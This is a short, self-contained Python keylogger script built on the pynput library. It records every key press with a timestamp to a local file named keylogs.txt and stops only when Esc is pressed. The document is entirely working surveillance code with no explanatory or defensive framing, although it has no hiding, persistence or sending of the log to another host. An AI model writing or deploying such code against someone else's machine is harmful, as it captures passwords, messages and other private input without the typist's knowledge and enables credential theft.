```python
import os
import sys
import time
from pynput import keyboard

log_file = 'keylogs.txt'

def write_to_file(key):
    with open(log_file, 'a') as f:
        f.write(str(key))

def on_press(key):
    try:
        current_time = time.ctime()
        key_name = str(key).replace("'", "")
        if key == keyboard.Key.esc:
            return False
        else:
            write_to_file('[' + current_time + '] ' + key_name + '\n')
    except Exception as e:
        print(e)
        return False

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```